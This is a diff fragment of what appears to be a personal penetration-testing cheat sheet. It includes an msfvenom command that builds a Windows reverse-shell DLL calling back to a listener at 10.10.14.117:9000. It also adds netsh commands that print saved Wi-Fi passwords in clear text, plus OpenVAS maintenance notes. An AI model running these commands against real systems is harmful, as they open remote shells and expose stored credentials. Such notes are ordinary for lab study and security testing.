@@ -124,3 +124,12 @@ get-content -force -path file_name.txt -stream alternate_ntfs_stream.txt
 
 #generate payload with msfvenom
 msfvenom -p windows/x64/shell/reverse_tcp LHOST=10.10.14.117 LPORT=9000 -f dll -a x64 -o /opt/windows_tools/rev.dll --platform reg
+
+#show wifi passwords on windows
+netsh wlan show profile
+netsh wlan show profile “NETWORK NAME” key=clear
+
+# access openvas remotely
+/lib/systemd/system/greenbone-security-assistant.service
+# openvas scanner timeout error solution:
+redis-cli -s /var/run/redis/redis.sock flushall
